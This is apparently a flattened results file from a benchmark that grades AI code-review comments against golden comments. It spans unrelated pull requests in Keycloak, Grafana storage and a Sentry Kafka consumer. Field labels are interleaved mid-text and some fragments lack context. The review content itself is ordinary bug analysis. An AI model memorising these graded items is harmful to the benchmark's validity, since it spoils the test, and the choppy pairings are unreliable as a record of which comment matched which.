2. The returned set is consumed as a set of *group ids*: `UsersResource.searchForUser` puts it in `session.setAttribute(UserModel.GROUPS, groupIds)` (restricting the user query to members of those groups) and `UsersResource.getUsersCount` passes it to `session.users().getUsersCount(realm, ..., groupIds)`. Because the ids are authz resource ids, they match no group, so an admin holding an all-groups `view-members`/`manage-members` permission gets zero users and a count of 0 from `/users` and `/users/count`.

The V1 implementation deliberately strips the resource-name prefix (`resource.getName().substring(RESOURCE_NAME_PREFIX.length())`) to produce group ids; V2 should use `groupResource.getName()`. Note also that resources created by `AdminPermissionsSchema.getOrCreateResource` never get `setType(...)`, so `findByType(server, "Groups", ...)` only returns the single "Groups" resource-type resource, never the per-group resources - the loop can therefore never enumerate individual groups. No test covers this code path (the existing tests pass via the per-user `canView(user)` filter).
true_positives.reasoning: The candidate identifies the same resource-ID versus underlying group-ID mismatch in getGroupIdsWithViewPermission, including passing the wrong ID to hasPermission and returning IDs incompatible with user group filters and counts. Its additional observations do not change the core match.

When no per-group resource is found, the code falls back to `AdminPermissionsSchema.SCHEMA.getResourceTypeResource(session, server, GROUPS_RESOURCE_TYPE)` and immediately dereferences the result via `policyStore.findByResource(server, resource)` and later `resource.getScopes()`, without a null check. `getResourceTypeResource` returns `null` whenever the resource named "Groups" is absent for the admin-permissions client. This is reachable for any realm where admin permissions were enabled before this change: `AdminPermissionsSchema.init()` returns early when the admin permissions client already exists, and there is no migration that adds the newly introduced "Groups" resource/scopes to existing resource servers. Any group-related permission check in such a realm will then fail with a NullPointerException (HTTP 500) instead of simply denying access.

`MgmtPermissionsV2` now overrides `groups()` to return `GroupPermissionsV2`, whose `setPermissionsEnabled(...)`/`isPermissionsEnabled(...)` throw `UnsupportedOperationException`. `AdminPermissions.registerListener` (registered whenever `ADMIN_FINE_GRAINED_AUTHZ` is enabled) handles `GroupModel.GroupRemovedEvent` by calling `management(session, realm).groups().setPermissionsEnabled(group, false)`, and `management(...)` returns `MgmtPermissionsV2` as soon as `ADMIN_FINE_GRAINED_AUTHZ_V2` is enabled. With both features enabled, deleting any group in any realm therefore throws `UnsupportedOperationException`, failing the delete request (500) and aborting the transaction. The same override also makes `GET/PUT /groups/{id}/management/permissions` fail with 500 instead of operating on the v1 permission model. Either the listener/endpoints must be gated to the v1 implementation, or these methods must degrade gracefully (no-op/false) in v2.

`hasPermission` only falls back to the "all groups" resource when no resource exists for the specific group. A per-group resource is created as soon as *any* group-scoped permission references that group (`AdminPermissionsSchema.getOrCreateResource`). Because per-group resources are created without a resource type, type-based policy evaluation does not apply either. Result: once an admin creates, say, a `manage-membership` permission for group G, all broader all-groups permissions (e.g. `view`, `view-members`) stop applying to G, so an administrator who could previously view G loses that access as a side effect of an unrelated permission being created for G. The scopes granted at the resource-type level should be evaluated in addition to, not instead of, the group-specific resource.

getResourceName does not handle the new Groups resource type

`getResourceName` only special-cases `USERS` (returning "All users" or the username). For the newly added `Groups` resource type it falls through to `resource.getDisplayName()`, which is `null` for resources created by `getOrCreateResource` (they are created with name = group id and no display name). Admin API/console responses that list the resources of a group scope permission will therefore show `null`/empty instead of the group name or "All groups", unlike the Users resource type. The method needs a `GROUPS` branch resolving the group by id (and a name for the all-groups resource).

switch over resourceType throws NPE for a null resource type

The previous implementation used `USERS.getType().equals(resourceType)` chains, which tolerated a `null` `resourceType` and ended up throwing the descriptive `IllegalStateException("Could not map resource object ...")`. `switch (resourceType)` on a `String` throws `NullPointerException` when the argument is null, which surfaces as an opaque HTTP 500 for any caller that reaches `getOrCreateResource` without a resource type. Add an explicit null check that raises `ModelValidationException` (consistent with `throwExceptionIfResourceTypeOrScopesNotProvided`).

Incorrect Javadoc on new GroupPermissionEvaluator methods

Two of the newly added Javadoc blocks are wrong: `requireManageMembers(GroupModel)` is documented as "Throws ForbiddenException if {@link #canManageMembership(GroupModel)} returns false" (it actually checks `canManageMembers`), and `getGroupIdsWithViewPermission()` documents "@return Stream of IDs of groups with view permission" although the method returns a `Set<String>`. Since these interfaces are the contract used by other modules (admin-ui-ext, services), the wrong text is likely to be copied into new implementations.

No negative test that a view-only group permission does not grant manage

`testViewGroups` creates an all-groups `VIEW` permission and only asserts that groups become visible. There is no assertion that this read-only permission does not allow write operations (creating a top-level group, updating a group, adding a child). Such an assertion would have caught that `GroupPermissionsV2.canManage()` returns `true` for the `view` scope, which currently lets a view-only admin create top-level groups. Similarly, no test exercises `getGroupIdsWithViewPermission()` (all-groups `view-members` permission combined with `GET /users` and `GET /users/count`), which is why the id/name mix-up in that method goes unnoticed.

true_positives.matched_candidate:
Indefinite-length encoding (-1 from readLength) is not handled by readInteger/readSequence

The candidate describes concrete failure paths rather than the golden comment's subtraction, but the underlying invalid-length handling issue is the same.

true_positives.golden_comment: Abstract order() method on CryptoProvider may break backward compatibility with existing implementations
true_positives.matched_candidate:
order() added as a non-default interface method breaks existing CryptoProvider implementations

CryptoProvider is a public SPI in keycloak-common. Adding the abstract method `int order();` is a source- and binary-incompatible change: any out-of-tree implementation (and, per the PR description, the authz-client copy maintained in the keycloak-client repository which compiles against a released keycloak-common) will no longer compile, and pre-compiled implementations will fail at runtime with AbstractMethodError when CryptoIntegration sorts the providers. Declaring it as `default int order() { return 0; }` (or some neutral baseline) keeps compatibility while still allowing the new provider to lower/raise its precedence.
true_positives.reasoning: Both identify the same backward-compatibility issue: adding an abstract, non-default order() method to CryptoProvider breaks existing implementations. The candidate adds details about compilation and runtime failures and suggests a compatible default implementation.

false_positives.candidate:
Multiple crypto providers are now silently tolerated, with non-deterministic tie-breaking

detectProvider() no longer throws when more than one CryptoProvider is found on the classpath; it just sorts by order() and picks the first. All three in-tree providers (DefaultCryptoProvider, FIPS1402Provider, WildFlyElytronProvider) return order() == 200, and Stream.sorted() is stable, so when two of them are on the classpath the selected provider is decided purely by ServiceLoader/classpath discovery order. The removed IllegalStateException was the guard that caught exactly this misconfiguration; now a deployment that accidentally has both the non-FIPS BouncyCastle provider and the FIPS provider on the classpath can silently run non-FIPS crypto (or vice versa) with no error, and the behaviour can change between environments or build layouts. Either keep failing when two providers share the same order, or give the real providers distinct orders and log at WARN/ERROR when more than one is present.

logger.debugf() called with a dynamically built string as the format

`logger.debugf(builder.toString())` passes runtime-constructed text as the format string. If any ignored provider class name ever contains a '%' the formatter will throw or produce garbage, and static analysis/IDE format checks cannot validate it. Use `logger.debugf("%s", builder)` (or logger.debug(Object)). The message should also be built lazily (guarded by isDebugEnabled) and, given that silently ignoring a crypto provider used to be a fatal error, logged at WARN rather than DEBUG so misconfigured classpaths are visible. The message also ends with a dangling ", ".

integerToBytes silently truncates integers larger than the expected signature half-length

When `qLength < bytes.length` the method keeps only the low-order qLength bytes of the BigInteger, silently discarding high-order bytes. The BouncyCastle-based implementation this replaces uses BigIntegers.asUnsignedByteArray(len, value), which raises an error when the value does not fit. With this implementation a DER signature containing an r/s value wider than the algorithm's half-length (corrupt input, or a mismatch between the key curve and the declared ES* algorithm) is converted to a wrong concatenated R||S value instead of failing, which turns a detectable error into a silently invalid signature. It should throw IOException when the value does not fit in qLength bytes.

Test uses the default EC curve for ES384/ES512 and never validates the produced DER with a verifier

The key pair is generated once with `KeyPairGenerator.getInstance("EC")` using the JDK default curve (P-256 on current JDKs), so testES384/testES512 sign with a P-256 key while asserting against signature lengths 96/132. The round-trip assertion still passes because r/s are simply zero-padded, so the real P-384/P-521 r/s widths produced by concatenatedRSToASN1DER are never exercised. Additionally the test only asserts rsConcat == rsConcat2; it never feeds the DER output of concatenatedRSToASN1DER into Signature.verify(), which is the actual production use of that method (JWS signature verification), so an encoder that produces structurally parseable but non-DER output would not be caught. Generate keys with the curve matching each algorithm (secp256r1/secp384r1/secp521r1) and verify the re-encoded DER with a JCA Signature.

true_positives.golden_comment: Returning null from getSubGroupsCount() violates the GroupModel contract (Javadoc says it never returns null) and may lead to NPEs in callers that expect a non-null count.
true_positives.matched_candidate:
getSubGroupsCount() now returns null, which is not part of the GroupModel contract

`GroupAdapter.getSubGroupsCount()` returns `null` when the underlying group no longer exists. `GroupModel.getSubGroupsCount()` returns a boxed `Long` but no implementation (e.g. the JPA adapter) ever returns `null` and the interface documents no nullability, so callers are free to unbox or compare the result. Any such caller now gets a NullPointerException at the call site instead of here – i.e. the NPE is relocated rather than removed – and REST responses can silently carry `subGroupCount: null`. Prefer returning `0L` (or handling the removed-group case explicitly, e.g. by skipping the group) instead of leaking `null` through the model API.

true_positives.golden_comment: The reader thread isn’t waited for; flipping deletedAll to true and asserting immediately can race and miss exceptions added just after the flag change, making this test flaky.
true_positives.matched_candidate:
Reader thread is never joined, so the regression test can pass while the NPE happens

`createMultiDeleteMultiReadMulti` starts a background thread that repeatedly lists groups and records exceptions into `caughtExceptions`, but the main thread only sets `deletedAll = true` and immediately runs `assertThat(caughtExceptions, Matchers.empty())`. There is no `Thread.join()` (and no synchronization between setting the flag and the assertion), so an exception thrown by the very iteration that races with the last deletions – exactly the window this test is meant to cover – can be appended after the assertion has already run, making the test green even when the regression is present. In addition the thread is non-daemon and keeps issuing admin requests after the test method returns (until it observes the flag), which can produce errors/log noise or interfere with teardown of the managed realm and admin client. The thread reference should be kept and joined before asserting.
true_positives.reasoning: Both identify the same race: the test sets deletedAll and asserts before waiting for the reader thread, allowing exceptions to be recorded after the assertion and causing false passes or flakiness. The candidate's additional teardown concerns do not change the underlying match.

false_positives.candidate:
Same concurrent-removal NPE still present in the getSubGroupsStream overloads

The fix only guards `getSubGroupsCount()` against `modelSupplier.get()` returning `null`. The three `getSubGroupsStream(...)` overloads (lines 256, 262 and 268) call `modelSupplier.get().getSubGroupsStream(...)` with no null check, and `modelSupplier` resolves to `cacheSession.getGroupDelegate().getGroupById(realm, cached.getId())`, which returns `null` for a group removed by a concurrent transaction after the cache entry was obtained. Under the same race that motivated this PR (listing groups while groups are being deleted) those paths will still throw a NullPointerException, so the reported bug is only partially fixed for group tree/search endpoints.

populateGroupHierarchyFromSubGroups still dereferences a possibly-removed parent group

In `populateGroupHierarchyFromSubGroups`, `session.groups().getGroupById(realm, currGroup.getParentId())` can return `null` when the parent group is deleted concurrently with the listing request. `parentModel` is then passed to `groupEvaluator.canView(parentModel)` (line 51), to `toRepresentation(groupEvaluator, parentModel, full)` (line 57) and to `populateSubGroupCount(parentModel, parent)` (line 60) without any null check, producing a NullPointerException on exactly the concurrent read/delete path this PR aims to fix (and unconditionally when fine-grained admin permissions are enabled, since the `canView` block is skipped). A null `parentModel` should abort the walk for that branch (e.g. remove the current group from the map and break), analogous to the existing not-viewable handling.

The background reader calls `managedRealm.admin().groups().groups(...)` while the main thread performs deletes through the same injected `Keycloak` admin client. The admin client's token manager/JAX-RS proxy is not documented as thread-safe; concurrent token refresh from two threads can produce intermittent 401/`NotAuthorizedException`, which this test would record in `caughtExceptions` and report as a failure of the group-listing code. Using a separate admin client instance (or at least a dedicated token) for the reader thread would avoid attributing client-side races to the server fix being tested.

Tight busy loop issuing unbounded group queries

The reader thread loops with no pause, each iteration requesting `groups(null, 0, Integer.MAX_VALUE, true)`. This saturates a CPU and floods the server with full-table group listings for the whole duration of the 100 deletions, slowing the test suite and making timing-sensitive neighbouring tests more flaky. A small sleep between iterations (and a bounded `maxResults`) would keep the race window without the load.

Created groups are not registered for cleanup

The 100 groups created in `createMultiDeleteMultiReadMulti` are only removed by the explicit delete loop; nothing is registered with `managedRealm.cleanup()`. If any `remove()` call or an earlier assertion fails, the remaining `Test Group N` entries stay in the realm, which is shared by all other test methods in this class, so a single failure here can cascade into unrelated failures in group-listing tests.

isConditionalPasskeysEnabled requires user != null, disabling passkeys on the normal login page

`isConditionalPasskeysEnabled(UserModel user)` returns true only when `user != null`. Both call sites use it to decide whether to call `webauthnAuth.fillContextForm(context)`: `authenticate()` (line 115) and the error `challenge(context, error, field)` override (line 137). With the new condition, a first-time visitor (user == null) no longer gets any of that, so the primary ID-less passkey login (auto-login with a discoverable key, 'Sign in with passkey' link, passkey autofill on the username/password page) is silently removed, and the same happens on the error re-render after a bad username/password. false_positives.candidate:
Overriding shouldShowWebAuthnAuthenticators() to false removes the 'user has no passkey' guard during re-authentication

`WebAuthnAuthenticator.fillContextForm()` used the `user != null` branch not only to publish `ALLOWED_AUTHENTICATORS`, but also to bail out (`return null`) when the identified user has no credential of the relevant type. By overriding `shouldShowWebAuthnAuthenticators()` to always return `false` in the conditional-UI authenticator, that branch is never taken, so during re-authentication (where the user is already known) the passkey/conditional-UI markup is now injected unconditionally for every user in a passkeys-enabled realm, including users that have no passwordless WebAuthn credential at all. Combined with the `UsernameForm` change (which no longer skips the username form during re-authentication when passkeys are enabled), such users get an extra, useless screen with a passkey prompt, and any passkey they pick from the platform list that belongs to another account ends in a WEBAUTHN_ERROR_DIFFERENT_USER error page. A check that the already-identified user actually has the passwordless credential configured is needed before enabling the conditional UI.

reauthenticationOfUserWithoutPasskey does not test a user without a passkey

The test name and the inline comment at line 304 ('Passkeys login should not be available on the page as this user does not have passkey') claim it covers re-authentication of a user that has no passkey, but the test sets `setWebAuthnPolicyPasskeysEnabled(Boolean.FALSE)`, i.e. passkeys are disabled for the whole realm. The absence of the `webauth` form therefore proves nothing about per-user credentials. The actually interesting (and currently unverified) scenario introduced by this PR - passkeys enabled for the realm, user already identified for re-authentication but owning no passwordless WebAuthn credential - remains untested, which is exactly the path where the conditional UI is now shown unnecessarily. Either rename/retarget this test or add a second test with passkeys enabled and a user without a passkey credential.

The blocks at lines 291-296 and 312-317 call `driver.findElement(...)` inside `try { ...; fail(...); } catch (Exception nsee) { /* expected */ }`. false_positives.candidate:
Index/lifecycle init failure now aborts server construction (and therefore process startup)

`NewResourceServer` now calls `s.Init(ctx)` and returns the error. Previously initialization was lazy, so a failure only broke the individual gRPC call that triggered it. Now any failure in `lifecycle.Init`, `search.init` (which lists all resource stats and builds every index), or `initWatcher` makes the constructor fail, which propagates up through DI and prevents the storage server / Grafana from starting at all. This is a real, reachable scenario: for file-backed bleve indexes `bleve.New(dir, mapper)` (pkg/storage/unified/search/bleve.go:98) returns `ErrorIndexPathExists` when the directory from a previous run is still on disk (the code itself has a TODO about not yet checking the persisted RV), and transient DB errors during `GetResourceStats` have the same effect. Startup also now blocks for the full duration of indexing all namespaces. Consider keeping init asynchronous/retryable, or at least making index build failures non-fatal.

cancel() is not called when Init fails in NewResourceServer, leaking goroutines

The cancelable context created at line 229 is only cancelled via `server.Stop`. On the new error path (`err := s.Init(ctx); if err != nil { return nil, err }`), the constructor returns without calling `cancel()`, so the context (and anything already started under it) is leaked. This matters because `search.init` may already have called `storage.WatchWriteEvents` and started the SQL poller/event-handling goroutines before the error occurred; nothing will ever stop them, and the caller has no handle to the server to call `Stop`. Call `cancel()` (and ideally `lifecycle.Stop`) before returning the error.

Removing per-request Init() checks makes the shutdown guard dead code

`Stop` sets `s.initErr` to "service is stopping" / "service is stopped", which used to be surfaced to clients because every handler started with `if err := s.Init(ctx); err != nil { return nil, err }`. All of those checks were removed in this diff, so no handler ever reads `initErr` again. After `Stop()` has cancelled the background context and the backend lifecycle has shut down, Create/Update/Delete/Read/List/Watch/Search now proceed into a stopped backend instead of returning a clear "service is stopping" error, producing confusing driver-level errors (or worse, work against a closed DB). Either keep a lightweight state check in the handlers or remove the now-misleading `initErr` assignments in `Stop`.

Data race on shared `err` and `totalBatchesIndexed` in searchSupport.init

Inside `group.Go(...)` the closure writes the function-scoped `err` variable (`_, _, err = s.build(...)`) and increments `totalBatchesIndexed++`. With `group.SetLimit(s.initWorkers)` these closures run concurrently, so both are unsynchronized writes from multiple goroutines: a genuine data race (the race detector will flag it), an undercounted `namespaced_indexed` span attribute, and — worse — error misattribution: one goroutine can overwrite `err` with `nil` before another returns it (swallowing a build failure) or a goroutine can return an error produced by a different build. Since init failure now aborts server startup (server.go:258), a spuriously propagated error can block the whole process. Use a local `err :=` inside the closure and an atomic/counter for the batch count.

BuildIndex still discards the span context, so the indexing work is not under its span

This PR's stated goal includes fixing trace propagation (`ctx, span := ...` in search.go and sql/backend.go), but `bleveBackend.BuildIndex` still uses `_, span := b.tracer.Start(ctx, ...)` and never passes the derived context anywhere. The `builder(idx)` callback executed at line 126 captures the caller's context instead, so all the list/iterate/document-build spans produced during the actual indexing attach to the parent `unified_search.Build` span rather than to `unified_search.bleve.BuildIndex`, leaving BuildIndex as an empty leaf span and making it impossible to attribute index build time in traces.

Storage-server integration test silently disabled for postgres in CI

The only integration test that boots the `StorageServer` module target is now skipped for postgres with the comment "test not working with postgres in Drone. Works locally." This PR moves unified storage initialization (index build, watcher start) into `NewResourceServer`, i.e. into module startup — exactly the code path this test exercises — so disabling it removes CI coverage of the change for one of the supported databases and hides whatever failure prompted the skip (it may well be caused by this PR's startup-blocking init rather than by Drone). The root cause should be identified before the skip is merged, or the skip should link to a tracking issue with the observed failure.

false_positives.candidate:
Queue pool is destroyed on strategy close, so the consumer silently drops every message after a rebalance

`SimpleQueueProcessingStrategy.close()` (and `terminate()`/`join()`) calls `self.queue_pool.shutdown()`, which sets `worker.shutdown = True` and calls `queue.shutdown()` on every queue. The `FixedQueuePool` is created once in `ResultsStrategyFactory.__init__` (result_consumer.py:133) and reused for every `create_with_partitions()` call. Arroyo invokes `close()`/`join()` on the strategy whenever partitions are revoked and then builds a new strategy on the next assignment. After the first rebalance the factory hands the new strategy the already-shut-down pool: the worker threads are dead and `work_queue.put()` raises `queue.ShutDown`, which is swallowed by the broad `except Exception` in `submit()` (line 317) where the offset is then marked complete and committed. The result is that every subsequent message is committed without ever being processed – permanent, silent data loss after any rebalance or partition reassignment. The pool (and its workers) needs to be created per assignment, or `close()` must not destroy state owned by the factory.

OffsetTracker state is never reset between partition assignments

The `FixedQueuePool` (and therefore its single `OffsetTracker`) is created once per factory and shared across all `create_with_partitions()` calls. `OffsetTracker.last_committed` and `all_offsets` therefore survive partition revocation. If a partition is revoked and later reassigned at a lower offset (offset reset, another consumer having made less progress, topic re-creation), `get_committable_offsets()` computes `start = max(last_committed + 1, min_offset)` and only reports an offset when `highest_committable > last_committed`, so no offset for that partition will ever be committed again and the consumer group silently stops advancing. In-flight work items belonging to the previous assignment also remain tracked and can be committed by the new strategy for partitions the consumer no longer owns.

Offsets are committed from a background thread, outside arroyo's single-threaded strategy contract

`_commit_loop` runs in its own daemon thread and calls `self.commit_function(committable)`, which is arroyo's `commit` callable wired to `StreamProcessor`/`KafkaConsumer`. Arroyo strategies are only ever called from the main consumer thread, and `KafkaConsumer.stage_offsets`/`commit_offsets` mutate consumer state (staged offsets, assignment/state checks) without locking. Committing from this thread races with `poll()`/rebalance callbacks on the main thread and can stage offsets for partitions that were just revoked, which arroyo rejects with `ConsumerError`, or corrupt the staged-offset bookkeeping. The exception is merely logged by the loop's `except Exception`, so the failure is invisible while offsets stop advancing.

Failed work items have their offsets committed, contradicting the documented at-least-once guarantee

In `OrderedQueueWorker.run`, any exception raised by `result_processor` is logged and the `finally` block still calls `offset_tracker.complete_offset(...)`, so the offset becomes committable. The same happens in `SimpleQueueProcessingStrategy.submit` (lines 317-325) when `grouping_fn` or the queue put fails. This makes processing at-most-once: a transient failure (DB blip, timeout) permanently drops the message, while the class docstring claims "No item is lost" and "Only commits offsets after successful processing". Either failures must block the commit / be routed to a DLQ, or the documented guarantee must be corrected.

Queues are unbounded, so there is no backpressure and memory can grow without limit

`queue.Queue()` is created with the default `maxsize=0` (unbounded) and `submit()` never raises `MessageRejected`, so arroyo will keep feeding messages as fast as it can poll regardless of how far behind the workers are. The docstring of `SimpleQueueProcessingStrategy` claims "Natural backpressure when queues fill up", which cannot happen. Each queued `WorkItem` additionally retains the full `Message[KafkaPayload]` (field `message`, never read anywhere), so a slow group pins both the decoded result and the raw Kafka payload in memory, and a backlogged consumer will OOM instead of applying backpressure.

Shutdown sets the worker stop flag before queue.shutdown(immediate=False), so queued items are discarded instead of drained

`FixedQueuePool.shutdown()` first sets `worker.shutdown = True` for every worker and only then calls `q.shutdown(immediate=False)`. Because the worker loop is `while not self.shutdown:`, each worker exits right after finishing the item it currently holds, so the "non-immediate" shutdown that is supposed to let queued items drain has no effect and all pending items are dropped. Combined with `close()` joining the commit thread before the pool shuts down, the final set of completed offsets may also never be committed, so a normal restart re-reads and re-processes more messages than necessary.

Worker threads can block forever on queue.get(); shutdown failures are swallowed and leak threads

`OrderedQueueWorker.run` uses a blocking `self.work_queue.get()` with no timeout, so the `self.shutdown` flag is only observed after an item arrives. Termination relies entirely on `queue.Queue.shutdown()` succeeding, but `FixedQueuePool.shutdown()` wraps that call in `except Exception: logger.exception(...)` (line 239). If it raises for any reason (e.g. the method is unavailable on the running Python version), every idle worker stays blocked in `get()`, `worker.join(timeout=5.0)` is executed sequentially for each worker, and shutdown stalls for 5s × num_queues (100s with the default of 20) before leaking the threads. Using `get(timeout=...)` would make the stop flag effective.

test_thread_queue_parallel_error_handling asserts behaviour the implementation does not provide

The test makes the result processor raise and then asserts `len(committed_offsets) == 0 or test_partition not in committed_offsets`, i.e. that a processing error prevents the offset from being committed. The implementation does the opposite: `OrderedQueueWorker.run` completes the offset in its `finally` block even when processing raises, so offsets 100 and 101 become committable. The assertion only holds because the polling loop breaks within ~0.3s while the commit thread ticks once per second; if the commit tick lands first the test fails. This test is both flaky and encodes a guarantee that does not exist – it should assert the real behaviour (or the behaviour should be fixed).

Commit assertions race with the 1-second commit loop and will flake

`test_offset_committing` and `test_handles_invalid_messages` wait for the first `commit_event` and then assert an exact final offset (104, resp. 101). The commit thread runs independently every second and commits whatever contiguous prefix is complete at that moment, so a tick that happens after only some offsets have been processed sets `commit_event` with a lower offset (e.g. 100 or 102); the subsequent `commit_event.wait()` returns immediately because the event is never cleared again and the equality assertion fails. The tests should poll until the expected offset is observed (or clear/re-wait) instead of asserting on the first commit.

FilteredPayload messages are handled through the exception path, producing an error log per message

`decode_payload` in the result consumer starts with `assert not isinstance(payload, FilteredPayload)`, which is outside its own try/except, so for every filtered message the `AssertionError` propagates into `submit()`'s broad `except Exception` and is reported via `logger.exception("Error submitting message to queue")`. Filtered payloads are a normal part of arroyo pipelines (e.g. when the stale-message DLQ wrapper is enabled), so this turns routine filtering into a flood of error-level exceptions with stack traces and relies on exceptions for ordinary control flow. `submit()` should check for `FilteredPayload` explicitly and complete the offset without logging.

A gauge is emitted for every processed item on the hot path

`OrderedQueueWorker.run` calls `metrics.gauge("remote_subscriptions.queue_worker.queue_depth", ...)` in the `finally` block of every single work item, with only an `identifier` tag so all 20 workers overwrite the same series. This adds per-message statsd overhead for a value that is already exported once per `poll()` by `SimpleQueueProcessingStrategy.poll` (`total_queued`), and the per-worker value is meaningless after aggregation. Emit it periodically rather than per item.
